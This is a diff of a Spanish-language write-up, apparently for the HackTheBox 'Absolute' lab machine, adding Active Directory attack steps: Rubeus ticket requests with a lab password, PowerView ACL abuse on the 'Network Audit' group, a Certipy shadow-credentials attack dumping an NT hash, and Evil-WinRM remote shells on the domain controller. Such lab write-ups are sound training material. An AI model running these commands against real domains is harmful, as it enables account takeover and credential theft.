@@ -634,7 +823,7 @@ Impacket v0.9.25.dev1+20230823.145202.4518279 - Copyright 2021 SecureAuth Corpor
 ❯ net rpc group addmem "Network Audit" -U m.lovegod -S dc.absolute.htb -k m.lovegod
 WARNING: The option -k|--kerberos is deprecated!
 ```
-
+{: .nolineno }
 
 ```bash
 ❯ cat /etc/krb5.conf
@@ -663,8 +852,8 @@ WARNING: The option -k|--kerberos is deprecated!
 ❯ kinit m.lovegod
 Password for m.lovegod@ABSOLUTE.HTB: 
 ```
-
-```
+{: .nolineno }
+```bash
 ❯ klist
 Ticket cache: FILE:/tmp/krb5cc_1000
 Default principal: m.lovegod@ABSOLUTE.HTB
@@ -675,8 +864,8 @@ Valid starting     Expires            Service principal
 11/06/23 19:39:07  11/06/23 23:38:56  cifs/dc.absolute.htb@ABSOLUTE.HTB
 	renew until 11/06/23 23:38:56
 ```
-
-```
+{: .nolineno }
+```bash
 ❯ KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.absolute.htb -r absolute.htb -u winrm_user
                                         
 Evil-WinRM shell v3.5
@@ -706,12 +895,16 @@ Ethernet adapter Ethernet0 3:
    Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%11
                                        10.129.0.1
 ```
-
+{: .nolineno }
 
 ### Método 2: Desde Windows
 
+![img](/assets/img/post/Absolute/15.png)
+
+Bien ahora tenemos que crear una sesión como `m.lovegod`. Como la autenticación por NTLM está desactivada, usaré Kerberos para hacerlo. Para ello haré uso de `rubeus.exe`, generaré un ticket 
+
 ```
-PS C:\Users\Alex\Desktop\HTB\Absolute> C:\Users\Alex\Desktop\tools\Rubeus.exe renew /ticket:winrm_user.kirbi /ptt
+PS C:\users\alex\desktop\HTB> C:\tools\Rubeus.exe asktgt /user:m.lovegod /password:AbsoluteLDAP2022! /domain:absolute.htb /ptt /enctype:aes256
 
    ______        _
   (_____ \      | |
@@ -722,43 +915,202 @@ PS C:\Users\Alex\Desktop\HTB\Absolute> C:\Users\Alex\Desktop\tools\Rubeus.exe re
 
   v2.2.0
 
-[*] Action: Renew Ticket
+[*] Action: Ask TGT
 
-[*] Using domain controller: dc.absolute.htb (10.129.68.75)
-[*] Building TGS-REQ renewal for: 'ABSOLUTE.HTB\winrm_user'
-[+] TGT renewal request successful!
+[*] Using aes256_cts_hmac_sha1 hash: 7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
+[*] Building AS-REQ (w/ preauth) for: 'absolute.htb\m.lovegod'
+[*] Using domain controller: 10.129.229.59:88
+[+] TGT request successful!
 [*] base64(ticket.kirbi):
 
-      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
+      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
+      bHV0ZS5odGI=
 [+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/absolute.htb
+  ServiceRealm             :  ABSOLUTE.HTB
+  UserName                 :  m.lovegod
+  UserRealm                :  ABSOLUTE.HTB
+  StartTime                :  07/11/2023 18:17:04
+  EndTime                  :  07/11/2023 22:17:04
+  RenewTill                :  07/11/2023 22:17:04
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable
+  KeyType                  :  aes256_cts_hmac_sha1
+  Base64(key)              :  A6io03SBq6jyfBE1PzZB8a5V02ZRhPIXsYVYiNvDnqA=
+  ASREP (key)              :  7455663292585851686A2C8B2DF22DCA5B0A3E84404DD480466E982E49B10554
+
+PS C:\users\alex\desktop\HTB>
 ```
+
+```
+PS C:\users\alex\desktop\HTB> klist
+
+El id. de inicio de sesión actual es 0:0x25e7d
+
+Vales almacenados en caché: (2)
+
+#0>     Cliente: m.lovegod @ ABSOLUTE.HTB
+        Servidor: krbtgt/absolute.htb @ ABSOLUTE.HTB
+        Tipo de cifrado de vale Kerberos: AES-256-CTS-HMAC-SHA1-96
+        Marcas de vale 0xe10000 -> renewable initial pre_authent name_canonicalize
+        Hora de inicio: 11/7/2023 18:17:04 (local)
+        Hora de finalización:   11/7/2023 22:17:04 (local)
+        Hora de renovación: 11/7/2023 22:17:04 (local)
+        Tipo de clave de sesión: AES-256-CTS-HMAC-SHA1-96
+        Marcas de caché: 0x1 -> PRIMARY
+        KDC llamado:
+
+#1>     Cliente: m.lovegod @ ABSOLUTE.HTB
+        Servidor: cifs/dc.absolute.htb @ ABSOLUTE.HTB
+        Tipo de cifrado de vale Kerberos: AES-256-CTS-HMAC-SHA1-96
+        Marcas de vale 0xa50000 -> renewable pre_authent ok_as_delegate name_canonicalize
+        Hora de inicio: 11/7/2023 18:17:58 (local)
+        Hora de finalización:   11/7/2023 22:17:04 (local)
+        Hora de renovación: 11/7/2023 22:17:04 (local)
+        Tipo de clave de sesión: AES-256-CTS-HMAC-SHA1-96
+        Marcas de caché: 0
+        KDC llamado: dc.absolute.htb
+```
+
+
+```
+PS C:\users\alex\desktop\HTB> dir \\dc.absolute.htb\shared
+
+
+    Directorio: \\dc.absolute.htb\shared
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----        08/06/2022     15:22             72 compiler.sh
+-a----        08/06/2022     19:29          67584 test.exe
+
+```
+
+```
+PS C:\users\alex\desktop\HTB> Import-Module \tools\PowerView.ps1
+```
+
+```
+PS C:\users\alex\desktop\HTB> Add-DomainObjectAcl -TargetIdentity "Network Audit" -Rights WriteMembers -PrincipalIdentity m.lovegod -DomainController dc.absolute.htb
+```
+
+![img](/assets/img/post/Absolute/16.png)
+
+![img](/assets/img/post/Absolute/17.png)
+
+
+![img](/assets/img/post/Absolute/19.png)
+
+### Shadow Credentials
+
+```bash
+❯ kdestroy
+❯ kinit m.lovegod
+Password for m.lovegod@ABSOLUTE.HTB:
+```
+
+```bash
+❯ KRB5CCNAME=/tmp/krb5cc_1000 certipy-ad shadow auto -username m.lovegod@absolute.htb -account winrm_user -k -target dc.absolute.htb
+Certipy v4.7.0 - by Oliver Lyak (ly4k)
+
+[*] Targeting user 'winrm_user'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '7bd93d9f-929e-6f28-ccea-c147fe59cf42'
+[*] Adding Key Credential with device ID '7bd93d9f-929e-6f28-ccea-c147fe59cf42' to the Key Credentials for 'winrm_user'
+[*] Successfully added Key Credential with device ID '7bd93d9f-929e-6f28-ccea-c147fe59cf42' to the Key Credentials for 'winrm_user'
+[*] Authenticating as 'winrm_user' with the certificate
+[*] Using principal: winrm_user@absolute.htb
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to 'winrm_user.ccache'
+[*] Trying to retrieve NT hash for 'winrm_user'
+[*] Restoring the old Key Credentials for 'winrm_user'
+[*] Successfully restored the old Key Credentials for 'winrm_user'
+[*] NT hash for 'winrm_user': 8738c7413a5da3bc1d083efc0ab06cb2
+```
+
+```
+❯ ls *.ccache
+ winrm_user.ccache
+```
+
+
+#### WinRM - Linux
+
+```bash
+❯ KRB5CCNAME=winrm_user.ccache evil-winrm -i dc.absolute.htb -u winrm_user -r absolute.htb
+                                        
+Evil-WinRM shell v3.5
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Warning: User is not needed for Kerberos auth. Ticket will be used
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\winrm_user\Documents> whoami
+absolute\winrm_user
+*Evil-WinRM* PS C:\Users\winrm_user\Documents> ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Ethernet0 3:
+
+   Connection-specific DNS Suffix  . : .htb
+   IPv6 Address. . . . . . . . . . . : dead:beef::11e
+   IPv6 Address. . . . . . . . . . . : dead:beef::701c:5194:8596:b43b
+   Link-local IPv6 Address . . . . . : fe80::701c:5194:8596:b43b%11
+   IPv4 Address. . . . . . . . . . . : 10.129.229.59
+   Subnet Mask . . . . . . . . . . . : 255.255.0.0
+   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%11
+                                       10.129.0.1
+*Evil-WinRM* PS C:\Users\winrm_user\Documents> 
+```
+
+
+#### WinRM: Windows
+
+```
+❯ impacket-ticketConverter winrm_user.ccache winrm_user.kirbi
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] converting ccache to kirbi...
+[+] done
+```
+
+```
+PS C:\Users\Alex\Desktop\HTB\Absolute> C:\Users\Alex\Desktop\tools\Rubeus.exe renew /ticket:winrm_user.kirbi /ptt
+```
+
+![img](/assets/img/post/Absolute/19.png)
 
 
 ```
@@ -814,26 +1166,7 @@ Client
     TrustedHosts = dc.absolute.htb
 ```
 
-```
-[dc.absolute.htb]: PS C:\Users\winrm_user\Documents> whoami
-absolute\winrm_user
-[dc.absolute.htb]: PS C:\Users\winrm_user\Documents> ipconfig
-
-Windows IP Configuration
-
-
-Ethernet adapter Ethernet0 3:
-
-   Connection-specific DNS Suffix  . : .htb
-   IPv6 Address. . . . . . . . . . . : dead:beef::19c
-   IPv6 Address. . . . . . . . . . . : dead:beef::7dc9:28ca:b147:9c36
-   Link-local IPv6 Address . . . . . : fe80::7dc9:28ca:b147:9c36%11
-   IPv4 Address. . . . . . . . . . . : 10.129.68.75
-   Subnet Mask . . . . . . . . . . . : 255.255.0.0
-   Default Gateway . . . . . . . . . : fe80::250:56ff:feb9:f8ec%11
-                                       10.129.0.1
-[dc.absolute.htb]: PS C:\Users\winrm_user\Documents>
-```
+![img](/assets/img/post/Absolute/20.png)
 
 ## Escalada de Privilegios
 
